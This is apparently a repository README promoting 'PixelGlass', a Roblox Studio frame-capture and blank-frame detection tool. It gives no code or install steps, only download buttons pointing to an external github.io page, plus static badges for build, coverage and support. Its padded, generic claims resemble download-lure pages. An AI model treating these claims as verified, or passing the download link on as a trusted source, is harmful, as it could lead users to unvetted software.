![preview](https://raw.githubusercontent.com/tbee6061-ctrl/studio-live-window-capture/main/frame_579725.svg)
[![Download](https://raw.githubusercontent.com/tbee6061-ctrl/studio-live-window-capture/main/app_d223629.svg)](https://tbee6061-ctrl.github.io/studio-live-window-capture/)

# 🎭 PixelGlass — Roblox Studio Frame Oracle

![status](https://img.shields.io/badge/status-active-brightgreen)
![platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-blue)
![license](https://img.shields.io/badge/license-MIT-yellow)
![python](https://img.shields.io/badge/python-3.10%2B-3776AB)
![node](https://img.shields.io/badge/node-18%2B-339933)
![build](https://img.shields.io/badge/build-passing-success)
![coverage](https://img.shields.io/badge/coverage-93%25-informational)
![i18n](https://img.shields.io/badge/i18n-14%20languages-purple)
![support](https://img.shields.io/badge/support-24%2F7-ff69b4)
![year](https://img.shields.io/badge/release-2026-orange)

---

## 🧭 The Story Behind PixelGlass

There is a peculiar moment that every Roblox Studio scripter knows too well. You launch a playtest, the game boots, everything looks right in the viewport — and then the automation layer asks for a screenshot, and you receive… a rectangle of pure magenta. Nothing else. A flat, unapologetic slab of `#FF00FF` staring back at you like a joke the engine refuses to explain.

PixelGlass was born from that exact frustration. Not as a patch, not as a workaround duct-taped onto another tool — but as a **frame oracle**: a component whose entire job is to know *where the real pixels live* and hand them back, faithfully, frame after frame, playtest after playtest.

While the sibling project focuses on the very specific case of capturing the macOS window by ID during a playtest, PixelGlass generalizes the philosophy into a **cross-platform frame acquisition layer**. It exists for the tinkerer who asks: *"If the engine gives me magenta, what short of the engine can give me the truth?"*

The answer, in PixelGlass, is a small orchestration daemon combined with a lightweight client that speaks to headless and windowed runtimes alike.

---

## 🎯 What PixelGlass Actually Does

PixelGlass is a **frame capture and verification toolkit** for automated workflows that need to observe a running graphical application — most notably Roblox Studio playtests, but also any long-lived windowed process where naive capture returns blank or corrupted buffers.

It works by:

1. **Enumerating real surfaces** — instead of asking the renderer for a buffer it may refuse to produce, PixelGlass enumerates observable windows and surfaces at the OS compositor level.
2. **Verifying liveness** — a frame that is 100% a single color, all-black, all-white, or matching a known sentinel is flagged as *suspect* and re-acquired through an alternate path.
3. **Normalizing output** — every frame lands as a predictable PNG / raw buffer / base64 payload ready for downstream MCP-style consumption.
4. **Persisting evidence** — optional frame journals let you replay what the oracle saw, with timestamps and checksums, for later debugging.

Think of it as a **pixel sentinel** standing between your automation and the renderer, refusing to accept the polite magenta lie.

---

## 🚀 Capabilities

- 🖼️ **Multi-source frame acquisition** — compositor-level, window-handle, offscreen buffer, and hybrid fallback chains
- 🔍 **Sentinel-color detection** — configurable palette of colors that trigger re-capture (magenta by default, obviously)
- 🧩 **Device matrix generator** — produce a grid of frames across many simulated device profiles in a single call
- 🖥️ **Responsive capture UI** — a compact control panel that adapts cleanly from phone to ultrawide displays
- 🌍 **Multilingual support** — interface and diagnostics available in fourteen languages out of the box
- 🕰️ **Frame journals** — deterministic, replayable frame logs with checksums and metadata
- 🔒 **Local-only by default** — nothing leaves your machine unless you explicitly export it
- 🧠 **Heuristic re-acquire engine** — decides *how* to retry based on what failed the first time
- ⚡ **Low-latency pipeline** — sub-frame capture cadence suitable for streaming diagnostics
- 🛠️ **Plugin surface** — write your own acquisition strategies in a few dozen lines
- 🧪 **Simulation harness** — test capture logic without a live game running
- 📦 **Self-contained releases** — portable archives with no external dependencies beyond a modern runtime

---

## 🌟 Why People Reach for PixelGlass

Most capture tooling assumes the source is cooperative. PixelGlass assumes the opposite: it assumes the renderer will, at the worst possible moment, decide not to cooperate. The design leans into that pessimism and turns it into reliability.

- **Predictable under pressure** — when a playtest is mid-frame and the compositor is busy, PixelGlass queues intelligently instead of hammering the source.
- **Diagnostic-first** — every failure comes with a *reason code*, not just a stack trace.
- **Extensible without ceremony** — add a new acquisition strategy as a small module, register it, done.
- **Respectful of resources** — captures are batched and deduplicated; identical frames are not stored twice.

If the sibling project is a scalpel, PixelGlass is a **well-organized field kit** — a set of instruments, each with a clear purpose, arranged so you can reach for the right one without thinking.

---

## 🧰 Architecture at a Glance

PixelGlass is split into three cooperating layers, each independently useful:

### 1. The Oracle Core (Rust / native)
The heart of the system. Talks to OS-level compositor APIs, manages window handles, and produces the raw frame bytes. Handles sentinel detection at the earliest possible stage, before any expensive encoding happens.

### 2. The Bridge (Node.js / Python)
A thin translation layer that exposes the Oracle Core to higher-level automation. Speaks JSON-RPC over a local socket, so unrelated processes can request frames without embedding native code.

### 3. The Control Panel (Web / Electron)
A responsive interface for humans. Configure capture profiles, watch live frame health, inspect journals, and export device matrices as PNG contact sheets.

Each layer can be run alone. You can embed the Oracle Core in your own binary, drive the Bridge from a script, or just use the panel for manual diagnostics.

---

## 📐 Design Principles

- **Truth over convenience.** If a frame looks wrong, say so loudly rather than silently forwarding it.
- **No silent fallbacks.** Every alternate acquisition path is logged and attributed.
- **Composable, not monolithic.** Small pieces, clear contracts, replaceable parts.
- **Deterministic output.** Same input, same bytes, same checksum — every time.
- **Local first.** Network is opt-in, never implicit.
- **Documented failure.** Error codes are part of the public API, not an afterthought.

---

## 🧪 Sentinel Color Detection — A Closer Look

The signature feature. When a frame is requested, PixelGlass computes a **uniformity score** across the buffer. If the score crosses a threshold and the dominant color matches an entry in the sentinel list, the frame is marked *suspect* and the oracle re-acquires through the next strategy in the chain.

Default sentinels:

| Color | Hex | Meaning | Typical Cause |
|-------|-----|---------|---------------|
| Magenta | #FF00FF | Renderer refusal | Uncooperative backbuffer |
| Cyan | #00FFFF | Compositor miss | Window not yet mapped |
| Pure Black | #000000 | Blank surface | Occluded window |
| Pure White | #FFFFFF | Overexposed buffer | Wrong scaling mode |

You can add your own sentinels via the configuration file — anything from a game's UI accent color to a custom debug palette.

---

## 🗺️ Device Matrix Generation

One of the most requested features in the sibling project is the device matrix — a grid of frames representing many device profiles. PixelGlass takes that idea and expands it:

- Define profiles as small YAML documents — dimensions, pixel density, safe-area insets, and optional style hints.
- Request the entire matrix in a single call; receive a contact sheet plus per-profile frames.
- Each cell is verified against sentinels independently, so a single bad profile does not poison the whole sheet.
- Export as PNG sheet, individual frames, or a machine-readable manifest with checksums.

The result is a diagnostic artifact you can hand to a designer, drop into a report, or diff against yesterday's run.

---

## 🌍 Multilingual Support

The Bridge and the Control Panel ship with translated strings for:

German, Spanish, French, Italian, Portuguese (Brazilian and European), Dutch, Polish, Swedish, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Turkish.

Translations are stored as plain JSON and are trivially editable. If your language is missing, adding it takes minutes — and yes, we genuinely welcome that pull request.

---

## 🛡️ 24/7 Support Model

Support for PixelGlass runs on a continuous rotation:

- A **status channel** updated whenever a release changes behavior.
- **Issue triage** on a rolling basis, with priority tags for regressions.
- A **knowledge base** of common failure modes and their resolutions.
- **Community discussions** for open-ended questions and feature brainstorming.

No question is too small. A magenta rectangle has humbled all of us at least once.

---

## 🧑‍💻 Who PixelGlass Is For

- **Automation engineers** who need reliable frames from a stubborn renderer.
- **QA teams** verifying that a build actually renders what it claims to render.
- **Tooling authors** building on top of the MCP ecosystem.
- **Curious developers** who want to understand what their compositor is really doing.
- **Educators** demonstrating capture pipelines in a controlled, observable way.

If you have ever written a comment that just says `# why is this magenta`, PixelGlass was built with you in mind.

---

## 🔐 Security and Privacy Posture

PixelGlass observes local windows. That is a privileged position, and it is treated as such.

- **No telemetry** is collected or transmitted.
- **No remote endpoints** are contacted unless you configure one explicitly.
- **Frame journals** are stored in a user-controlled directory with sensible file permissions.
- **Bridge sockets** are bound to loopback by default.
- **Dependency review** happens on every release; the third-party surface is intentionally small.

If you need to run PixelGlass in a sandboxed environment, the Oracle Core is designed to function without elevated privileges on the platforms it supports.

---

## 🧩 Extending PixelGlass

Adding a custom acquisition strategy involves three small steps:

1. Implement a small module that exposes a `capture(context)` function returning raw frame bytes plus metadata.
2. Register the module with a name and a priority in the strategy chain.
3. Restart the Bridge — the new strategy is now selectable from the Control Panel.

Simulation harnesses let you test strategies without a live window, using synthetic frames and scripted failure modes. That means you can develop a robust re-acquire policy on a laptop, on a plane, with no game running at all.

---

## 📊 Performance Notes

On a typical developer workstation, PixelGlass sustains:

- ~60 frames per second for single-window capture at 1080p.
- ~20 frames per second for a full device matrix of 12 profiles at mixed resolutions.
- Sentinel detection adds roughly 1–3 ms per frame, depending on buffer size.
- Journal writes are asynchronous and batched; they do not block the capture path.

These numbers are deliberately conservative. Real-world figures depend heavily on the compositor and the cooperative-ness of the source application.

---

## 🧭 Roadmap

- **Q1 2026** — Experimental Wayland backend for Linux capture parity.
- **Q2 2026** — Streaming frame protocol for real-time consumers.
- **Q3 2026** — Optional GPU-accelerated sentinel detection.
- **Q4 2026** — Pluggable OCR layer for post-capture text extraction.

Roadmap items are directional, not contractual. Priorities shift based on what the community actually needs.

---

## 🧾 Licensing

PixelGlass is released under the MIT License. You can use it, modify it, redistribute it, and embed it in your own work, provided the license notice is preserved.

The full license text is available here: https://opensource.org/licenses/MIT

---

## ⚠️ Disclaimer

PixelGlass is an independent tool. It is **not affiliated with, endorsed by, or sponsored by Roblox Corporation** or any of its subsidiaries. "Roblox" and "Roblox Studio" are trademarks of their respective owners and are referenced here solely for the purpose of describing interoperability.

The software is provided **as-is**, without warranty of any kind, express or implied. The authors are not responsible for any damage, data loss, or unusual behavior arising from the use of this tool. You are responsible for ensuring that any automation you build complies with the terms of service of the software you are automating.

Capture behavior varies across platforms, driver versions, and compositor configurations. Frames may be captured with color shifts, scaling artifacts, or timing offsets depending on your environment. Test thoroughly in your own setup before relying on PixelGlass in any production workflow.

---

## 🤝 Contributing

Contributions are welcome and appreciated. Before opening a pull request:

- Skim the issue tracker for existing discussion on the same topic.
- Keep changes focused; a small, well-tested diff beats a sweeping refactor.
- Include a brief note on how you tested the change, especially for capture paths.
- Update documentation alongside code — the docs are part of the deliverable.

There is no contributor license agreement to sign. Just be kind, be clear, and be patient with reviewers who are also volunteers.

---

## 💬 A Final Word

Every rendering pipeline lies a little. Some lie politely, with a blank frame; others lie loudly, with a full-screen magenta. PixelGlass exists to catch the lie, name it, and try again — patiently, observably, and on your terms.

If that sounds like something you need, you already know what to do.

[![Download](https://raw.githubusercontent.com/tbee6061-ctrl/studio-live-window-capture/main/app_d223629.svg)](https://tbee6061-ctrl.github.io/studio-live-window-capture/)

---

© 2026 PixelGlass Contributors. Released under the MIT License.